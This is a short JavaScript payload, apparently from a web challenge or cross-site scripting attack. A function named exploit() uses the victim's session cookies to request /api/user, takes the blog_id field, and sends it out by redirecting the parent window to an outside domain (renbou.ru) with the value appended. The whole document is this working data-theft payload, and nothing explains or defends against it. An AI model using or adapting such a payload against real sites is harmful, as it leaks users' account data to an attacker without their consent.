async function exploit() {
  const result = await fetch("/api/user", {
    method: "GET",
    credentials: "same-origin",
  }).then((r) => r.json());
  const blogID = result["blog_id"];

  window.parent.location = "https://renbou.ru/" + blogID;
}

exploit();
